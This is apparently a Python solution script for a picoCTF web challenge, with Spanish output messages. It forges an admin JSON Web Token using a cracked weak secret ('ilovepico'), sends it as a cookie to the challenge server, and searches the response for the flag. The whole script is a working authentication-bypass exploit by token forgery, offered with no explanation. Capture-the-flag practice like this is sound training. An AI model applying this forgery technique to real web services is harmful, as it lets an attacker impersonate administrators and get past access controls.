import jwt
import requests

secret = 'ilovepico'
admin_jwt = jwt.encode({'user': 'admin'}, secret, algorithm='HS256')
print('JWT para admin:', admin_jwt)

cookies = {'jwt': admin_jwt}
response = requests.get('https://jupiter.challenges.picoctf.org/problem/58210/', cookies=cookies)

print('=== BUSCANDO FLAG ===')
if 'picoCTF' in response.text:
    import re
    flag_match = re.search(r'picoCTF\{[^}]*\}', response.text)
    if flag_match:
        print('✅ FLAG ENCONTRADA:', flag_match.group())
    else:
        print('picoCTF encontrado pero no en formato esperado')
        print(response.text)
else:
    print('Revisando respuesta...')
    if 'admin' in response.text.lower():
        print('Parece que funciona como admin')
    print('Primeros 1000 caracteres:')
    print(response.text[:1000])